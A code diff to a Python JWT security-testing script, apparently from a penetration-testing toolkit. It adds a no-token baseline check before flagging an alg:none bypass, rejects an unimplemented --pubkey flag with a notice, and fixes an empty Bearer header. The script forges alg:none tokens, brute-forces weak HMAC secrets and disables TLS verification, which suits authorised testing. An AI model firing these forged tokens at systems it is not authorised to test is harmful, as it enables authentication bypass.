@@ -10,7 +10,8 @@ Actions:
   2. Check exp/iat/nbf, weak claims
   3. alg:none forge test (must have --url)
   4. Try common weak secrets (if HS*) + wordlist
-  5. RS256→HS256 confusion hint (needs --pubkey for real test)
+  5. RS256→HS256 confusion: NOT automated. --pubkey is rejected with a notice;
+     re-signing with the public key as HMAC secret is a manual step.
 No-arg = help.
 """
 import sys, os, json, base64, hmac, hashlib, time, ssl
@@ -52,11 +53,15 @@ def sign(header, payload, secret, alg):
     data = (_enc(header) + "." + _enc(payload)).encode()
     return b64u_encode(hmac.new(secret.encode(), data, digest).digest())
 
-def request(url, token, cookie):
+def request(url, token, cookie=None):
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    h = {"User-Agent": UA, "Authorization": "Bearer " + token}
+    h = {"User-Agent": UA}
+    # Only send the header when there is a token. Sending "Bearer " (empty)
+    # is a malformed request, not a no-token baseline.
+    if token:
+        h["Authorization"] = "Bearer " + token
     if cookie:
         h["Cookie"] = cookie
     r = urllib.request.Request(url, headers=h)
@@ -82,6 +87,7 @@ def main():
         print(__doc__)
         sys.exit(0)
     opts = {}
+    unknown = []
     i = 0
     while i < len(args):
         if args[i] == "--jwt":
@@ -93,7 +99,22 @@ def main():
         elif args[i] == "--wordlist":
             opts["wordlist"] = args[i + 1]; i += 2
         else:
+            if args[i].startswith("--"):
+                unknown.append(args[i])
             i += 1
+
+    # Never silently drop a flag: a user who passes --pubkey must be told the
+    # RS->HS check is not implemented here, not left thinking it ran.
+    if unknown:
+        for u in unknown:
+            if u == "--pubkey":
+                print(f"[!] {u} is not implemented — RS256→HS256 confusion is a manual "
+                      f"step (re-sign with the public key as the HMAC secret). "
+                      f"No automated check was run.")
+                print("    reference: novahaku SKILL.md → JWT section")
+            else:
+                print(f"[!] ignoring unknown argument: {u}")
+        print()
 
     tok = opts["jwt"]
     parts = tok.split(".")
@@ -135,10 +156,19 @@ def main():
     if url:
         none_header = b64u_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
         none_tok = none_header + "." + parts[1] + "."
+        # Baseline first: an endpoint that answers 200 to everyone proves
+        # nothing about the token. Only a difference between "no token" and
+        # "forged token" is evidence of a bypass.
+        st_none, _b_none = request(url, "")
         st, body = request(url, none_tok, cookie)
-        print(f"\n[alg:none] forged token -> status {st}")
-        if st and st not in (401, 403):
+        print(f"\n[alg:none] no token -> status {st_none} | forged token -> status {st}")
+        accepted = st and st not in (401, 403)
+        baseline_open = st_none and st_none not in (401, 403)
+        if accepted and not baseline_open:
             print(f"[!!] SERVER ACCEPTED alg:none! CRIT auth bypass. body: {body[:200]}")
+        elif accepted and baseline_open:
+            print(f"[-] inconclusive: endpoint already answers {st_none} without any token — "
+                  f"no auth boundary here, forged token proves nothing")
         else:
             print("[-] alg:none rejected")
 
